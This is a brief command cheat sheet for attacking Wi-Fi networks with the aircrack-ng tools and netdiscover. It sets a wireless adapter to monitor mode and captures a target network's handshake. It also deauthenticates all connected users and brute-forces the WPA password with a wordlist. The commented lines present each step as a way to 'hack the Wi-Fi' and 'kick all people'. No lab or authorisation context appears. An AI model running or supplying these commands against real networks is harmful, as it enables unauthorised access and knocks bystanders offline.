```bash
airmon-ng start wlan0
# start the adapter in monitoring mode to able to hack the Wi-Fi and the adapter becomes wlan0mon

airmon-ng stop wlan0mon
# stop monitoring mode and wlan0mon becomes wlan0

airmon-ng check kill
# check all process that run on the adapter and kill them all

airodump-ng wlan0mon
# scan for nearby Wi-Fi networks

airodump-ng wlan0mon -w /home/kali/handshake -c <channel> --bssid <mac>
# monitor a Wi-Fi network and wait for someone to connect to it

aireplay-ng --deauth 0 -a <mac> wlan0mon
# kick all people that connected to that Wi-Fi network
# 0 means kick all people

aircrack-ng /home/kali/handshake.cap -w /usr/share/wordlists/rockyou.txt
# brute-force Wi-Fi password
```

```bash
netdiscover -r 192.168.1.0/24
# discover connected devices to the network
```